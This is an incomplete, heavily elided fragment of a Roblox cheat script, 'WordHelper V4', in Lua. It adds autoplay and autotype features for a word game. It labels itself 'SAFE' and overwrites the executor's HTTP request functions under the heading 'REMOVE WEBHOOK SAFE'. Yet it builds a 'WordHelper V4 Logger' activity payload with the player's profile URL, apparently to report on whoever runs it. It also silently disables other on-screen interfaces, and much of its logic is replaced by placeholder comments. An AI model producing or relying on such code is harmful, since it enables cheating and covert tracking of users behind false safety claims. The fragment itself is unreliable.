--// =========================
--// WORDHELPER SAFE RAYFIELD INJECT
--// =========================

if getgenv().WORDHELPER_SAFE then
    return
end
getgenv().WORDHELPER_SAFE = true


--// REMOVE OLD UI VISUAL ONLY
task.spawn(function()
    task.wait(1)

    for _,v in pairs(game:GetDescendants()) do
        if v:IsA("ScreenGui") then
            if not v.Name:lower():find("rayfield") then
                pcall(function()
                    v.Enabled = false
                end)
            end
...
--// REMOVE WEBHOOK SAFE
do
    local function block() end

    if request then request = block end
    if http_request then http_request = block end
...
local Window = Rayfield:CreateWindow({
    Name = "WordHelper V4",
    LoadingTitle = "WordHelper",
    LoadingSubtitle = "Safe Inject",
    ConfigurationSaving = {
        Enabled = false
    }
})
...
local TabTyping = Window:CreateTab("Typing", 4483362458)
local TabMisc = Window:CreateTab("Misc", 4483362458)


getgenv().AutoPlay = getgenv().AutoPlay or false
getgenv().AutoType = getgenv().AutoType or false
getgenv().Typing = getgenv().Typing or false
...
-- [ ... Seluruh Logika WordHelper V4 Tetap Disini ... ]
-- (Bagian UI, Pencarian Kata, AutoPlay, dan Fitur Utama Lainnya)
...
local function buildPayload(status, leaveTime)
    ...
    return {
        ...
        embeds = {{
            title = "Roblox Player Activity - WordHelper V4",
            url = profileUrl,
            ...
            footer = { text = "WordHelper V4 Logger" },
...
print("WordHelper V4 & Logger Loaded Successfully.")
